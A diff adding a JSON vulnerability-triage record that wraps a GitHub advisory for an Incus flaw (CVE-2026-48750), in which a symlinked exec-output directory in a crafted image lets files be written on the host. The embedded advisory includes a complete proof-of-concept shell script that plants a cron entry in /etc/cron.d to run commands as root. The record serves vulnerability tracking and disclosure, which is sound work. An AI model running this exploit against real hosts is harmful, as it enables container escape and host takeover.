@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/25389335?v=4\", \"events_url\": \"https://api.github.com/users/antifob/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/antifob/followers\", \"following_url\": \"https://api.github.com/users/antifob/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/antifob/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/antifob\", \"id\": 25389335, \"login\": \"antifob\", \"node_id\": \"MDQ6VXNlcjI1Mzg5MzM1\", \"organizations_url\": \"https://api.github.com/users/antifob/orgs\", \"received_events_url\": \"https://api.github.com/users/antifob/received_events\", \"repos_url\": \"https://api.github.com/users/antifob/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/antifob/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/antifob/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/antifob\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/2230599?v=4\", \"events_url\": \"https://api.github.com/users/stgraber/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/stgraber/followers\", \"following_url\": \"https://api.github.com/users/stgraber/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/stgraber/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/stgraber\", \"id\": 2230599, \"login\": \"stgraber\", \"node_id\": \"MDQ6VXNlcjIyMzA1OTk=\", \"organizations_url\": \"https://api.github.com/users/stgraber/orgs\", \"received_events_url\": \"https://api.github.com/users/stgraber/received_events\", \"repos_url\": \"https://api.github.com/users/stgraber/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/stgraber/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/stgraber/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/stgraber\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-48750\", \"cvss\": {\"score\": 9.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-73\", \"name\": \"External Control of File Name or Path\"}], \"description\": \"### Summary\\n\\nThe `record-output` parameter of the `/instances/$name/exec` endpoint stores the output of the command in the `exec-output` directory of the instance. If `exec-output` is a symlink, file named `exec_UUID.stdout` and `exec_UUID.stderr` can be written to an arbitrary location where the `.stdout` file will contain arbitrary content. This behavior can be abused for arbitrary command execution.\\n\\n\\n### Details\\n\\nWhen an image is unpacked, top-level symlinks are extracted as is; allowing for `exec-output` to be placed on disk. In `instance_exec.go`, `os.Mkdir` continues of `exec-output` exists and `os.OpenFile` follows the `exec-output` symlink.\\n\\n\\n### PoC\\n\\nBelow, we place the `exec_UUID.stdout` file in `/etc/cron.d` on\\nthe host for arbitrary command execution.\\n\\n```\\n#!/bin/sh\\n# usage: $0 existing-imagefp\\nset -eu\\n\\nbasefp=\\\"${1}\\\"\\n\\ndie() {\\n        printf '%s' \\\"${@}\\\" >&2\\n        exit 1\\n}\\n\\ncommand -v curl >/dev/null 2>&1 || die 'error: curl not found\\\\n'\\ncommand -v python3 >/dev/null 2>&1 || die 'error: python3 not found\\\\n'\\n\\ntmpdir=$(mktemp -d)\\ncleanup() {\\n        rm -rf \\\"${tmpdir}\\\"\\n}\\ntrap cleanup EXIT INT QUIT TERM HUP\\n\\n\\n# insert exec-output symlink\\n\\nincus image export \\\"${basefp}\\\" \\\"${tmpdir}/img\\\"\\n\\nmkdir \\\"${tmpdir}/repack\\\"\\ncd \\\"${tmpdir}/repack\\\"\\n\\nxz -cd \\\"${tmpdir}/img\\\" | tar -f- -vx\\n\\nrm -rf exec-output\\nln -s /etc/cron.d exec-output\\n\\ntar -f- -c * | gzip -c9 >\\\"${tmpdir}/img\\\"\\n\\ncd - >/dev/null\\nincus image import \\\"${tmpdir}\\\"/img* --alias afw-exec-output\\n\\n\\n# Launch container, exec with record-output via REST API\\nincus launch afw-exec-output afw-exec-output\\nincus wait afw-exec-output ip\\n\\nOP=$(curl -s --unix-socket /var/lib/incus/unix.socket \\\\\\n  -X POST -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"command\\\":[\\\"/bin/sh\\\",\\\"-c\\\",\\\"echo * * * * * root id'\\\"'>'\\\"'/afw-exec-output\\\"],\\\"record-output\\\":true}' \\\\\\n  \\\"lxd/1.0/instances/afw-exec-output/exec\\\" | python3 -c \\\"import sys,json;print(json.load(sys.stdin)['operation'])\\\")\\n\\ncurl -s --unix-socket /var/lib/incus/unix.socket \\\"$OP/wait?timeout=30\\\" >/dev/null\\n\\n#find /etc/cron.d/exec_* -exec cat {} \\\\;\\n```\\n\\n### Impact\\n\\nConstrained file creation in an arbitrary directory on the host via\\nvia an unsanitized symlink; possibly leading to command execution.\", \"ghsa_id\": \"GHSA-73hr-m85f-64v9\", \"github_reviewed_at\": \"2026-06-26T18:32:52Z\", \"html_url\": \"https://github.com/advisories/GHSA-73hr-m85f-64v9\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-73hr-m85f-64v9\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-48750\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-26T18:32:52Z\", \"references\": [\"https://github.com/lxc/incus/security/advisories/GHSA-73hr-m85f-64v9\", \"https://github.com/advisories/GHSA-73hr-m85f-64v9\"], \"repository_advisory_url\": \"https://api.github.com/repos/lxc/incus/security-advisories/GHSA-73hr-m85f-64v9\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/lxc/incus\", \"summary\": \"Incus has an arbitrary file write on host via `exec-output` symlink in crafted image\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-26T18:32:53Z\", \"url\": \"https://api.github.com/advisories/GHSA-73hr-m85f-64v9\", \"vulnerabilities\": [{\"first_patched_version\": \"7.2.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/lxc/incus/v7/cmd/incusd\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 7.2.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-73hr-m85f-64v9",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/lxc/incus/v7/cmd/incusd: < 7.2.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-48750"
+    ],
+    "cvss_score": 9.9,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/lxc/incus/v7/cmd/incusd"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:51:57.119376Z",
+  "provenance": {
+    "content_sha256": "ea322d4c0203096fa4f746db723834446bc2ef438d4cbfcbe7f7416fcd6fbad3",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-26T18:32:52Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-73hr-m85f-64v9",
+  "status": "active",
+  "title": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image",
+  "updated_at": "2026-06-26T18:32:53Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-73hr-m85f-64v9"
+}
